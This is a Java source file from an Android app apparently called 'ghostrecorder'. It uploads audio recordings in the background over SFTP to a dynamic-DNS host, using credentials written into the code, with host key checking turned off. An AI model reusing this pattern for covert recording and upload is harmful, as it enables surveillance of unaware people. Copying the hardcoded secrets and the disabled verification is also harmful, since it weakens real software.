package com.byteshaft.ghostrecorder;


import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.KeyPair;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.net.SocketException;

public class UploadRecordingTask extends AsyncTask<String, String, Boolean> {

    private Session session = null;
    private Channel channel = null;
    private ChannelSftp channelSftp = null;
    private Helpers mHelpers;
    private String  mFileName = null;
    private static boolean UPLOAD_INTRUPTED = false;
    private Context mContext;
    private final String LOGTAG = AppGlobals.LOG_TAG + "/" + getClass().getName();

    public UploadRecordingTask(Context context) {
        mContext = context;
    }

    @Override
    protected Boolean doInBackground(String... params) {
        mHelpers = new Helpers();
        /* Host , port , username, password, directory for server*/
        String SFTPHOST = "pizzacutter.no-ip.org";
        int SFTPPORT = 57127;
        String SFTPUSER = "dataupload";
        String SFTPPASS = "j&ka1h39s7R";
        String SFTPWORKINGDIR = "/upload";
        Log.i(LOGTAG, "preparing the host information for sftp.");

        try {
            /*using jsch library for sending Recording to server*/
            connectToServer(SFTPHOST, SFTPPORT, SFTPUSER, SFTPPASS, SFTPWORKINGDIR);
            File file = new File(params[0]);
            mFileName = file.getName();
            Log.i(LOGTAG, "file Transfer started...");
            channelSftp.put(new FileInputStream(file), file.getName());
            Log.i(LOGTAG, "File transfered successfully to host.");

        } catch (SftpException e) {
            return UPLOAD_INTRUPTED = true;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

    private void connectToServer(String SFTPHOST, int SFTPPORT, String SFTPUSER,
                                 String SFTPPASS, String SFTPWORKINGDIR) {
        JSch jsch = new JSch();
        try {
            session = jsch.getSession(SFTPUSER, SFTPHOST, SFTPPORT);
            session.setPassword(SFTPPASS);
            java.util.Properties config = new java.util.Properties();
            // this part is not recommended Remove it in future
            config.put("StrictHostKeyChecking", "no");
            session.setConfig(config);
            session.connect();
            Log.i(LOGTAG, "Host connected.");
            channel = session.openChannel("sftp");
            channel.connect();
            Log.i(LOGTAG, "sftp channel opened and connected.");
            channelSftp = (ChannelSftp) channel;
            channelSftp.cd(SFTPWORKINGDIR);
        } catch (JSchException e) {
            e.printStackTrace();
        } catch (SftpException e) {
            e.printStackTrace();
        }

    }

    @Override
    protected void onPostExecute(Boolean aBoolean) {
        super.onPostExecute(aBoolean);
        Log.i(LOGTAG, "boolean value: " +aBoolean);
        if (UPLOAD_INTRUPTED) {
                Log.i(LOGTAG, "file upload intruptted");
            String notUploadedFile = mHelpers.path +  mFileName;
            System.out.println(notUploadedFile);
                RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
                        (mContext);
            recordingHelper.openDatabase();
            recordingHelper.createNewEntry(SqliteHelper.COULMN_DELETE, notUploadedFile);
            recordingHelper.createNewEntry(SqliteHelper.COULMN_UPLOAD, notUploadedFile);
        }
    }

    private void stopUploadingWhenFinished() {
            channelSftp.exit();
            Log.i(LOGTAG, "sftp Channel exited.");
            channel.disconnect();
            Log.i(LOGTAG, "Channel disconnected.");
            session.disconnect();
            Log.i(LOGTAG, "Host Session disconnected.");
    }
}

